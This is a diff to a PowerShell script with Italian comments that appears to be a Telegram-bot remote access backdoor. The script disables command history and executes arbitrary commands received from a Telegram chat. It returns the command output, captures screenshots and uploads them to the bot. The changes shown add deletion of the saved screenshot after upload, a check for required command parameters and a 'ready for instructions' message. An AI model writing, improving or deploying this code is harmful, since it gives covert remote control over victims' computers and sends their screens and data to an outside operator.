@@ -4,13 +4,13 @@ Set-PSReadlineOption -HistorySaveStyle SaveNothing
 Set-Location -Path $env:USERPROFILE
 
 $session = New-Object Microsoft.PowerShell.Commands.WebRequestSession
-$telegram_id, $api_token  = "@1", "@2"
+$telegram_id, $api_token = "@1", "@2"
 $api_get_updates    = 'https://api.telegram.org/bot{0}/getUpdates' -f $api_token
 $api_send_messages  = 'https://api.telegram.org/bot{0}/SendMessage' -f $api_token
 $api_get_file       = 'https://api.telegram.org/bot{0}/getFile?file_id=' -f $api_token
 $api_download_file  = 'https://api.telegram.org/file/bot{0}/' -f $api_token
 $api_upload_file    = 'https://api.telegram.org/bot{0}/sendDocument?chat_id={1}' -f $api_token, $telegram_id
-$logs = $false
+$logs = $true
 $Global:ProgressPreference = 'SilentlyContinue'
 
 
@@ -43,11 +43,12 @@ function GetScreenshot {
         $bitmap = New-Object System.Drawing.Bitmap $screen.Bounds.Width, $screen.Bounds.Height
         $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
         $graphics.CopyFromScreen($screen.Bounds.Location, [System.Drawing.Point]::Empty, $bitmap.Size)
-        $outputPath = Join-Path $env:userprofile "screen.png"
+        $outputPath = Join-Path $env:APPDATA "screen.png"
         $bitmap.Save($outputPath, [System.Drawing.Imaging.ImageFormat]::Png)
         $bitmap.Dispose()
         $graphics.Dispose()
         SendFile $outputPath
+        Remove-Item $outputPath -Force
     }
     catch {
         SendMessage $Error[0]
@@ -94,10 +95,15 @@ function SendMessage($output)
 {
     Log "Procedo ad inviare il messaggio"
 
-    $MessageToSend = New-Object psobject
-    $MessageToSend | Add-Member -MemberType NoteProperty -Name 'chat_id' -Value $telegram_id
-    $MessageToSend | Add-Member -MemberType NoteProperty -Name 'parse_mode' -Value "html"
-    $MessageToSend | Add-Member -MemberType NoteProperty -Name 'text' -Value ("<pre>" + "[HOST ($hostia)]`n" + $output + "</pre>")
+    # To escape _*``[\
+    $output = $output -replace "([$([regex]::Escape('_*``[\'))])", "\\`$1"
+
+    $MessageToSend = @{
+        chat_id    = $telegram_id
+        parse_mode = "MarkdownV2"
+        text       = "``````#$hostia`n$output`n``````"
+    }
+
     $MessageToSend = $MessageToSend | ConvertTo-Json
 
     try {
@@ -106,6 +112,46 @@ function SendMessage($output)
     } catch {
         Log "Il messaggio non è stato inviato: [$($Error[0])]"
         Start-Sleep -Seconds 3
+    }
+}
+
+
+
+
+function CheckRequiredParameters {
+    param (
+        [string]$CommandString
+    )
+
+    # Dividi la stringa del comando in un array di parole
+    $commandParts = $CommandString -split ' '
+
+    # Il primo elemento è il nome del comando
+    $commandName = $commandParts[0]
+
+    # Ottieni i parametri obbligatori per il comando
+    $requiredParameters = Get-Help -Name $commandName -Parameter * | Where-Object { $_.Required -eq $true -and $_.Position -eq 0 } | Select-Object -ExpandProperty Name
+
+    if ($requiredParameters.Count -eq 0) {
+        Log "Il comando $commandName non ha parametri obbligatori."
+        return $true
+    }
+
+    # Restringi l'array agli argomenti (escludendo il nome del comando)
+    $arguments = $commandParts[1..$($commandParts.Count - 1)]
+
+    # Estrai i nomi dei parametri dagli argomenti
+    $parameterNames = $arguments -match '^[-/]([\w]+)[:=]?' | ForEach-Object { $_ -replace '^[-/]|[:=]$' }
+
+    # Verifica se i parametri obbligatori sono presenti tra i nomi dei parametri
+    $missingParameters = $requiredParameters | Where-Object { $_ -notin $parameterNames }
+
+    if ($missingParameters.Count -gt 0) {
+        SendMessage "Il comando '$commandName' richiede i seguenti parametri obbligatori mancanti: $($missingParameters -join ', ')"
+        return $false
+    } else {
+        Log "Il comando $commandName ha tutti i parametri obbligatori necessari."
+        return $true
     }
 }
 
@@ -148,6 +194,7 @@ function CommandListener
                             } else {
                                 $hostname = $check_command[1]
                             }
+                            SendMessage "Computer pronto a ricevere istruzioni"
                             continue
                         }
                         
@@ -161,7 +208,11 @@ function CommandListener
                         if ($user_id -match $telegram_id) {
                             if ($text.Length -gt 0) {
                                 try {
-                                    $output = Invoke-Expression -Command $text | Out-String
+                                    if (CheckRequiredParameters -CommandString $text) {
+                                        $output = Invoke-Expression -Command $text | Out-String
+                                    } else {
+                                        continue
+                                    }
                                 } catch {
                                     $output = $Error[0] | Out-String
                                 }
